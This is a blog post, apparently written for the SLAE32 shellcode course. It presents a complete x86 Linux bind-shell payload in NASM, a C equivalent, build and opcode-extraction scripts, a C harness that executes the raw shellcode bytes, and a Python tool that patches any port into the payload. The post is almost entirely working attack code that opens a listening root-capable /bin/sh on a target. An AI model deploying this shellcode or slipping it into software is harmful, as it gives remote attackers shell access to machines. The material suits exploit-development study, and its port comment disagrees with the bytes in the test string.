---
title:  "Bind Shellcode written  for x86 in nasm"
---


During SLAE32/SLAE64, I had a lot of fun writing x86 and x64 shellcode in NASM. 
In this post I will share my code of an x86 bind shell (linux), and some utilities to deploy shellcodes quicker.
-----

_NOTE_: If you prefer, you can clone the repos here:

1. [https://github.com/goodguyandy/slae32](slae32)
2. [https://github.com/goodguyandy/slae64](slae64)

------

# bind shell source code

```nasm
global _start

section .text

_start:

  ;---------------------------------------------
  ; int socket(int domain, int type, int protocol 
  ;----------------------------------------------
  xor eax, eax ; eax = 0
  xor ebx, ebx ; ebx = 0
  xor edx, edx ; edx = 0 
  
  push ebx         ; protocol = 0 
  push 0x1         ; type = 1
  push 0x2         ; domain = 2 
  mov al, 0x66     ; socketcall 
  mov bl, 0x1      ; int call (SOCKET)
  lea  ecx, [esp]  ; pointer to arguments
  int 0x80         ; eax after call contains fd of the socket 


  ;-----------------------------
  ;int bind(int sockfd, const struct sockaddr *addr, int len) 
  ;--------------------------------------------
  mov esi,eax  ; esi contains fd , we keep it for later
  
  ;lets build sockaddr_in
  push edx     ; edx = 0, 0.0.0.0
  push word 0x3905  ; port 1337  (reverse order)  
  push word 0x2     ; family - AF_INET
  

  mov ecx, esp
  push 0x10    ; len 
  push ecx         ;pointer to struct
  push esi  ; esi = file descriptor
  mov al , 0x66
  mov bl , 0x2 
  mov ecx, esp 
  int 0x80 ;return 0 if working 


  ;----------------------------------------
  ; listen (sockfd, backlog) 
  ;---------------------------------
  push edx   ; backlog 
  push esi   ; sockfd (esi contains fd)
  mov edi, ebx ; we will use edi as counter later for dup2  
  
  mov al , 0x66 
  mov bl, 0x4   ; listen 
  mov ecx, esp  ; pointer to listen args   
  int 0x80   
 

  ;---------------------------------
  ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  ;---------------------
  push edx ; null pointer to socklen 
  push edx ; null pointer to socckaddr 
  push esi ; sockfd 

  mov al, 0x66
  mov bl , 0x5 ;accept 
  mov ecx, esp
  int 0x80 

  ;----------------------------
  ; int dup2(int oldfd, int newfd)
  ;-----------------------------
  
  mov ebx, eax  ; eax points to oldfd returned from accept 
  xchg ecx, edi  ; ecx is now a counter with value 2 
  inc ecx        ; so can loop better
  mov al, 0x3f 
  
dup2:


    dec ecx 
    ;call dup2
    mov al,0x3f ; syscall for dup2 
    ;ebx already set
    ;ecx - newfd, already set 
    int 0x80 
 
    ;loop 
    jnz dup2        


  ;-------------------------------
  ; int execve(const char *filename, char *const argv[], char *const envp[]);
  ;----------------------------
  push edx ; envp 
  push edx ; argv 
  push 0x68732F6E
  push 0x69622F2F ;//bin/sh, filename 
  mov ebx, esp  ; *filename 
  mov al, 0xb ; syscall for execve 
  int 0x80 
```



## compiling and testing
For compiling, you can use a quick wrapper of nasm:

```sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'

```

also you can use a quick shellcode extractor like this:

```sh
name=$1
out=$(objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
echo "---------- opcodes -------"
echo "$out"
echo "--------------------------"
if [[ $out  =~ "\x00" ]]
then 
    echo "attention, null byte found:"
    echo $out | grep --color=auto "\x00" 
    echo "--------"
    objdump -D $1 -M intel | grep 00
    echo "--------"
fi
if [[ $out  =~ "\x0a" ]]
then 
    echo "attention, new line byte found:"
    echo $out | grep --color=auto "\x0a" 
    echo "--------"
    objdump -D $1 -M intel | grep 0a
    echo "--------"
fi

```

for testing the shellcode:

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xd2\x53\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x8d\x0c\x24\xcd\x80\x89\xc6\x52\x66\x68\x27\x0F\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x52\x56\x89\xdf\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x52\x52\x56\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x87\xcf\x41\xb0\x3f\x49\xb0\x3f\xcd\x80\x75\xf9\x52\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
and some python utilities for example to convert in littlendian strings etc:


```python
#!/usr/bin/env python2

def littlen(s):
    s = s.encode("hex")
    s = bytearray.fromhex(s)
    s.reverse()
    return ''.join(format(x,'02x') for x in s).upper()
    

def pushstr(s):
    s = littlen(s)
    for i in range(0, len(s),8):
        print "push " +  s[i:i+8] 

def str2bytes(s):
    s = s.encode("hex")
    s = bytearray.fromhex(s)
    return ''.join(format(x,'02x') for x in s).upper()



```
## bind shell


### c source for reference

```c

#include <sys/socket.h>
#include <sys/types.h>         
#include <stdio.h>
#include <netinet/in.h>



int main() {
  int sockfd = socket(2,1,0);
  
  struct sockaddr_in st;
  st.sin_family = 2;
  st.sin_port = htons(1337);


  inet_aton("0.0.0.0", &st.sin_addr.s_addr);
  int r = bind(sockfd, ( struct sockaddr *) &st, sizeof(st));

  listen(sockfd, 0);
  int fd = accept(sockfd, NULL, NULL);
  
  int i;
  for(i=0; i<=2;i++) {
   dup2(fd, i);
  }

  execve("/bin/sh", NULL ,NULL); 
  return 0;
}
```




### set up quickly of the generated shellcode (example)


```python

import argparse

parser = argparse.ArgumentParser(description='Quickly set the port for a x86 linux bind shellcode\n')
parser.add_argument('port', metavar='p', type=int, nargs=1,
                    help='port number')

args =parser.parse_args()
port =args.port[0]

#error checking
if (port > 66535 or port < 0):
    print("[LOG]: insert a valid port number!")
    exit(1)

#convert int to hex and format it 
port = '{0:0{1}X}'.format(port,4)
port = '\\x' + '\\x'.join(port[i:i+2] for  i in range(0, len(port), 2))
shellcode =r'"\x31\xc0\x31\xdb\x31\xd2\x53\x6a\x01\x6a\x02\xb0\x66\xb3\x01\x8d\x0c\x24\xcd\x80\x89\xc6\x52\x66\x68' + port  + r'\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x52\x56\x89\xdf\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x52\x52\x56\xb0\x66\xb3\x05\x89\xe1\xcd\x80\x89\xc3\x87\xcf\x41\xb0\x3f\x49\xb0\x3f\xcd\x80\x75\xf9\x52\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";'
print(shellcode)
```



